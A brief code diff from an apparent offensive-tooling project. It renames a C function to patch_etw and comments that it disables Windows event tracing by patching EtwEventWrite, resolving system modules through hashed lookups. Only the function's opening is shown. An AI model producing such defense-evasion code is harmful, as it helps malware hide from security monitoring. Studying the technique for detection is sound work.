@@ -1,6 +1,8 @@
 #include "evasion.h"
 
-int disable_etw(void) {
+
+// Disable ETW by patching EtwEventWrite to return 0
+int patch_etw(void) {
     HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
     HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load Ntdll module
     
